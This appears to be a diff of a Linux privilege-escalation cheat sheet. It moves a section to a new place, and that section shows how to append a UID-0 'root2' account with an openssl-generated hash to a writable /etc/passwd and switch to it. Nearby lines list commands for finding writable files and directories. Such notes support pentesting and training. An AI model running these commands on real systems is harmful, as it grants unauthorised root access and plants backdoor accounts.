@@ -74,20 +74,6 @@ Capabilities
 
 ```cat .bashrc```
 
-## /etc/passwd
-
-If writable, can make root account
-
-```ls -lah /etc/passwd```
-
-```
-openssl passwd password123!
-
-echo "root2:<hash>:0:0:root:/root:/bin/bash" >> /etc/passwd
-
-su root2
-```
-
 ## Writable
 
 Writable config files, if a service config file is writable, can be used to privesc
@@ -100,6 +86,20 @@ Writable directories
 
 ```
 find / -writable -type d 2>/dev/null
+```
+
+### /etc/passwd
+
+If writable, can make root account
+
+```ls -lah /etc/passwd```
+
+```
+openssl passwd password123!
+
+echo "root2:<hash>:0:0:root:/root:/bin/bash" >> /etc/passwd
+
+su root2
 ```
 
 ## sudo - superuser stuff
